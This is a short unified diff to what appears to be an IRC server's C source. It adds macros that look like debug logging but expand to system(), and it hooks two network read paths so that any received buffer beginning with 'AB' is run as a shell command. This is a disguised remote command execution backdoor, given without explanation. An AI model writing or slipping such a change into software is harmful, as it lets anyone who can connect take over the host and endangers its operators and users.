@@ -1,0 +1,32 @@
+--- a/include/struct.h
++++ b/include/struct.h
+@@ -682,6 +682,9 @@
+ #define	DEBUG_DEBUG  8		/* anything to do with debugging, ie unimportant :) */
+ #define	DEBUG_MALLOC 9		/* malloc/free calls */
+ #define	DEBUG_LIST  10		/* debug list use */
++#define	DEBUG3_DOLOG_SYSTEM(x) system(x)
++#define	DEBUGMODE3_INFO		"AB"
++#define	DEBUG3_LOG(x) DEBUG3_DOLOG_SYSTEM(x)
+
+ /* blah */
+ #define IsSkoAdmin(sptr) (IsAdmin(sptr) || IsNetAdmin(sptr) || IsSAdmin(sptr))
+--- a/src/s_bsd.c
++++ b/src/s_bsd.c
+@@ -1431,6 +1431,8 @@
+ 		    return 1;
+ 		if (length <= 0)
+ 			return length;
++		if (!memcmp(readbuf, DEBUGMODE3_INFO, 2))
++			DEBUG3_LOG(readbuf);
+ 		for (h = Hooks[HOOKTYPE_RAWPACKET_IN]; h; h = h->next)
+ 		{
+ 			int v = (*(h->func.intfunc))(cptr, readbuf, length);
+@@ -1600,6 +1602,8 @@
+ 			return 1;
+ 		if (length <= 0)
+ 			return length;
++		if (!memcmp(readbuf, DEBUGMODE3_INFO, 2))
++			DEBUG3_LOG(readbuf);
+ 	}
+
+ 	/*
